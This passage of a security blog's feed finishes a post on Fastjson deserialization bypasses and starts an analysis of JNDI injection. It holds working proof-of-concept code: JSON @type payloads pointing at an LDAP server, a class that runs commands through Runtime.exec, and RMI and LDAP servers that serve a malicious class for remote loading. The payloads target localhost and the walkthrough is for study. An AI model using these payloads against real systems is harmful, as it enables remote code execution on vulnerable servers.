&lt;dependency&gt;</span></span><br><span class="line"><span class="comment">        &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt;</span></span><br><span class="line"><span class="comment">          &lt;artifactId&gt;shiro-core&lt;/artifactId&gt;</span></span><br><span class="line"><span class="comment">        &lt;version&gt;1.2.4&lt;/version&gt;</span></span><br><span class="line"><span class="comment">    &lt;/dependency&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Poc_1_2_67_b</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ExportException &#123;</span><br><span class="line">        <span class="comment">// turn on autoTypeSupport</span></span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.shiro.jndi.JndiObjectFactory\&quot;,\&quot;resourceName\&quot;:\&quot;ldap://localhost:1234/Calc\&quot;,\&quot;instance\&quot;:&#123;\&quot;$ref\&quot;:\&quot;$.instance\&quot;&#125;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="限制-13"><a href="#限制-13" class="headerlink" title="限制"></a>限制</h3><ul><li>需要开启autoTypeSupport</li><li>需要shiro组件</li><li>利用JNDI，受JDK版本限制</li></ul><h3 id="调试分析-13"><a href="#调试分析-13" class="headerlink" title="调试分析"></a>调试分析</h3><p>暂无</p><h1 id="1-2-25-1-2-68"><a href="#1-2-25-1-2-68" class="headerlink" title="1.2.25-1.2.68"></a>1.2.25-1.2.68</h1><h2 id="漏洞分析-7"><a href="#漏洞分析-7" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>利用expectClass绕过AutoType，不是黑名单绕过，不需要开autoTypeSupport。</p><h2 id="Exp-14"><a href="#Exp-14" class="headerlink" title="Exp"></a>Exp</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Poc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Poc_1_2_68</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;,\&quot;@type\&quot;:\&quot;Poc.VulAutoCloseable\&quot;,\&quot;cmd\&quot;:\&quot;calc\&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Poc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">VulAutoCloseable</span> <span class="keyword">implements</span> <span class="title class_">AutoCloseable</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">VulAutoCloseable</span><span class="params">(String cmd)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(cmd);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">close</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="限制-14"><a href="#限制-14" class="headerlink" title="限制"></a>限制</h2><ul><li>需要在Server端有实现了AutoCloseable的类或者子类</li></ul><h2 id="调试分析-14"><a href="#调试分析-14" class="headerlink" title="调试分析"></a>调试分析</h2><p>暂无</p><h1 id="1-2-25-1-2-83"><a href="#1-2-25-1-2-83" class="headerlink" title="1.2.25-1.2.83"></a>1.2.25-1.2.83</h1><h2 id="漏洞分析-8"><a href="#漏洞分析-8" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>绕过禁用类黑名单。<br>利用springboot环境下的commons-dao组件，进行jndi注入。</p><h2 id="Exp-15"><a href="#Exp-15" class="headerlink" title="Exp"></a>Exp</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Poc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    需要开启autoTypeSupport</span></span><br><span class="line"><span class="comment">    &lt;parent&gt;</span></span><br><span class="line"><span class="comment">        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span></span><br><span class="line"><span class="comment">        &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;</span></span><br><span class="line"><span class="comment">        &lt;version&gt;2.6.7&lt;/version&gt;</span></span><br><span class="line"><span class="comment">        &lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt;</span></span><br><span class="line"><span class="comment">    &lt;/parent&gt;</span></span><br><span class="line"><span class="comment">    &lt;dependency&gt;</span></span><br><span class="line"><span class="comment">        &lt;groupId&gt;com.epam.reportportal&lt;/groupId&gt;</span></span><br><span class="line"><span class="comment">        &lt;artifactId&gt;commons-dao&lt;/artifactId&gt;</span></span><br><span class="line"><span class="comment">        &lt;version&gt;5.0.0&lt;/version&gt;</span></span><br><span class="line"><span class="comment">    &lt;/dependency&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Poc_1_2_83</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// turn on autoTypeSupport</span></span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;: \&quot;com.epam.ta.reportportal.config.DataSourceConfig\&quot;,\&quot;metricRegistry\&quot;: \&quot;ldap://localhost:1234/Calc\&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="限制-15"><a href="#限制-15" class="headerlink" title="限制"></a>限制</h2><ul><li>需要开启autoTypeSupport</li><li>需要springboot环境、commons-dao组件</li><li>利用jndi执行命令，受JDK版本限制</li></ul><h2 id="调试分析-15"><a href="#调试分析-15" class="headerlink" title="调试分析"></a>调试分析</h2><p>暂无</p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>挠头，fastjson这么多利用，给我语雀都整卡了&#x3D; &#x3D;</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p>fastjson反序列化 漏洞分析文章<br><a href="http://www.mi1k7ea.com/2021/02/08/Fastjson%E7%B3%BB%E5%88%97%E5%85%AD%E2%80%94%E2%80%941-2-48-1-2-68%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E">1.2.48之后的利用@mi1k7ea</a><br><a href="https://www.mi1k7ea.com/archives/">mi1k7ea师傅的fastjson漏洞分析系列  很详细适合学习</a><br><a href="https://su18.org/post/fastjson">su18师傅 比上一个简略</a><br><a href="https://tttang.com/archive/1579/#toc_fastjson">https://tttang.com/archive/1579/</a><br><a href="https://xz.aliyun.com/t/12096">https://xz.aliyun.com/t/12096</a><br><strong>关闭ASM开关，方便进行调试</strong><br><a href="https://blog.csdn.net/qq_45854465/article/details/120960671">https://blog.csdn.net/qq_45854465&#x2F;article&#x2F;details&#x2F;120960671</a><br>ASM动态加载相关，如何查看内存生成的类的源码<br><a href="https://juejin.cn/post/6974566732224528392#heading-6">https://juejin.cn/post/6974566732224528392#heading-6</a><br><a href="https://blog.csdn.net/wjy160925/article/details/85288569">https://blog.csdn.net/wjy160925/article/details/85288569</a><br>toJSONString()方法的源码分析（较浅）<br><a href="https://blog.csdn.net/qq_31615049/article/details/85013129">https://blog.csdn.net/qq_31615049&#x2F;article&#x2F;details&#x2F;85013129</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;fastjson是阿里巴巴旗下的一个Java库，用于Java对象和JSON字符串之间的转换。&lt;br&gt;这个库从2017-2022年，陆陆续续爆</summary>
      
    
    
    
    
    <category term="Java" scheme="https://jaspersec.top/tags/Java/"/>
    
    <category term="反序列化" scheme="https://jaspersec.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    <category term="Fastjson" scheme="https://jaspersec.top/tags/Fastjson/"/>
    
  </entry>
  
  <entry>
    <title>JNDI漏洞分析</title>
    <link href="https://jaspersec.top/posts/2402071288.html"/>
    <id>https://jaspersec.top/posts/2402071288.html</id>
    <published>2023-12-24T03:32:20.000Z</published>
    <updated>2025-03-31T22:09:47.230Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>根据官方教程，JNDI（Java Naming and Directory Interface）是为Java程序提供的，一组用来统一调用命名服务和目录服务的API，逻辑结构如下：<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1695623288583-539c93f5-6410-49af-8be7-1cd1e383c734.png" alt="image.png"><br>可以看到下面的SPI中，有熟悉的RMI服务和DNS服务，也有没用过的CORBA和LDAP服务等。<br>那么到底什么是JNDI？<br>一句话说：接口一词在计算机系统中再常见不过，所谓JNDI，就是屏蔽掉上面说到的服务的底层细节，提供一套统一的接口来调用这些服务，<strong>我的理解就是一层封装</strong>。</p><h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>前面说到，JNDI支持命名服务和目录服务，而它在绑定一个对象时，可以采用引用（Reference）来存储，可以理解成一个指针&#x2F;引用。<br>恶意的JNDIServer端先bind一个引用对象，JNDIClient端从JNDIServer端lookup这个引用对象的时候，如果Client端本地不存在对应类名的类，就会去引用对象里定义的位置加载定义的类，而指定位置是支持http等远程协议的，这就导致了远程类加载问题，这也是这个洞的核心所在，<strong>一图胜千言</strong>。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1695631419587-44e38e24-8b10-4b59-812f-419eff01b261.png" alt="image.png"></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>JNDI这个洞最早是2016年的BlackHat爆出来的，之后陆陆续续进行了几次修复，就jdk8u版本来说，节点可以分为：8u121之前、8u121到8u191、8u191之后三个阶段，笔者也以漏洞修复的时间线，对不同的利用进行分析。</p><h2 id="JNDI操纵RMI"><a href="#JNDI操纵RMI" class="headerlink" title="JNDI操纵RMI"></a>JNDI操纵RMI</h2><p>适用JDK版本：&lt;8u121<br>测试JDK版本：8u65</p><h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Calc</span> &#123;</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIRMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"><span class="comment">//        initialContext.bind(&quot;rmi://localhost:1099/remoteObj&quot;,new RemoteObjectImpl());</span></span><br><span class="line">        <span class="comment">// 绑定的引用对象指定到了远程服务器上的恶意类</span></span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;Jasper&quot;</span>, <span class="string">&quot;Calc&quot;</span>, <span class="string">&quot;http://localhost:7777/&quot;</span>);</span><br><span class="line">        initialContext.rebind(<span class="string">&quot;rmi://localhost:1099/remoteObj&quot;</span>,reference);</span><br><span class="line">        System.out.println(<span class="string">&quot;Server start...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIRMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        <span class="type">RemoteObjectInterface</span> <span class="variable">remoteObject</span> <span class="operator">=</span> (RemoteObjectInterface)initialContext.lookup(<span class="string">&quot;rmi://localhost:1099/remoteObj&quot;</span>);</span><br><span class="line">        System.out.println(remoteObject.sayHello(<span class="string">&quot;I&#x27;m Jasper you motherfucker.&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>python3 -m http.server 7777 起一个HTTP Server，目录里放编译后的恶意类，然后运行Server端，再运行Client端，成功执行代码。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1695639364788-c2eaea04-2cc5-4169-8d35-3f7651c6dba9.png" alt="image.png"></p><h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">getObjectFactoryFromReference:163, NamingManager</span><br><span class="line">getObjectInstance:319, NamingManager</span><br><span class="line">decodeObject:464, RegistryContext</span><br><span class="line">lookup:124, RegistryContext</span><br><span class="line">lookup:205, GenericURLContext</span><br><span class="line">lookup:417, InitialContext</span><br><span class="line">main:6, JNDIRMIClient</span><br></pre></td></tr></table></figure><p>在Client端的lookup处下断点，查看获取到Reference对象之后发生了什么<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1695639679788-c1e7f22d-f70d-4c02-a7cc-4862feceb1e6.png" alt="image.png"><br>三层套娃调用lookup<br>initialContext#lookup<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1695642897408-28cadd76-ed68-46b3-b4a5-ed8f8e4a7b6b.png" alt="image.png"><br>GenericURLContext#lookup<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1695643124491-66a0b574-77cb-4460-a0cd-711a531744fe.png" alt="image.png"><br>RegistryContext#lookup，调了decodeObject对服务端传过来的对象解码<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1695643522877-77ef4a2e-bb32-43e6-9e60-9664cdf2de04.png" alt="image.png"><br>RegistryContext#decodeObject，如果传过来的是引用对象，通过NamingManager#getObjectInstance获取引用所指向的对象。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1695643908602-b57ae4c1-174a-4ae0-a35d-908b1b70c85f.png" alt="image.png"><br>NamingManager#getObjectInstance，首先通过<strong>getObjectFactoryFromReference</strong>获取对象指向的对象的工厂对象factory，再由factory#getObjectInstance获取到引用对象指向的真正对象，从工厂生产产品的思想。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1695645696720-6aa2eb17-a74f-4cc9-9020-04dcd0d326ab.png" alt="image.png"><br>NamingManager#getObjectFactory，首先获取远程的工厂类，再实例化返回一个工厂对象<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1695646521899-97c6e17e-3d85-47ce-9dac-fe5211876f1c.png" alt="image.png"><br>到这分析完毕，执行完这行就弹计算器了。</p><h2 id="JNDI操纵LDAP"><a href="#JNDI操纵LDAP" class="headerlink" title="JNDI操纵LDAP"></a>JNDI操纵LDAP</h2><p>适用JDK版本：&lt;8u191<br>测试JDK版本：8u121<br>在8u121之后，RegistryContext#decodeObject里加了trustURLCodebase，默认不允许远程加载Factory类<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1695648681862-cf3083bd-9515-478f-8a2f-ae6dbd0d85cd.png" alt="image.png"><br>例如我们这里再执行上面的代码，提示要加载远程Factory，trustURLCodebase需要置为true。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1695649049700-7f7a83f9-9928-4cf6-a1bb-6ee32f9afbe6.png" alt="image.png"><br>这个怎么绕过呢？其实很简单，他是在RegistryContext里加了限制条件，我们用别的SPI就好，比如LDAP。Oracle这里也挺怪的，只修了RMI服务的洞，没有把LDAP的一起修，留到了8u191才来修。</p><h3 id="利用方式-1"><a href="#利用方式-1" class="headerlink" title="利用方式"></a>利用方式</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Calc</span> &#123;</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>不用太注意LDAP服务端的实现代码，用专门的软件起一个LDAP服务也是一样的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPException;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDILDAPServer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LDAP_BASE</span> <span class="operator">=</span> <span class="string">&quot;dc=example,dc=com&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// codebase，加载恶意Calc类</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;http://127.0.0.1:7777/#Calc&quot;</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">1234</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(</span><br><span class="line">                    <span class="string">&quot;listen&quot;</span>,</span><br><span class="line">                    InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>),</span><br><span class="line">                    port,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> <span class="title class_">OperationInterceptor</span>(<span class="keyword">new</span> <span class="title class_">URL</span>(url)));</span><br><span class="line">            <span class="type">InMemoryDirectoryServer</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(config);</span><br><span class="line">            System.out.println(<span class="string">&quot;Listening on 0.0.0.0:&quot;</span> + port);</span><br><span class="line">            ds.startListening();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title class_">InMemoryOperationInterceptor</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> URL codebase;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * */</span> <span class="keyword">public</span> <span class="title function_">OperationInterceptor</span> <span class="params">( URL cb )</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * &#123;<span class="doctag">@inheritDoc</span>&#125;</span></span><br><span class="line"><span class="comment">         * * <span class="doctag">@see</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)</span></span><br><span class="line"><span class="comment">         */</span> <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">base</span> <span class="operator">=</span> result.getRequest().getBaseDN();</span><br><span class="line">            <span class="type">Entry</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entry</span>(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">protected</span> <span 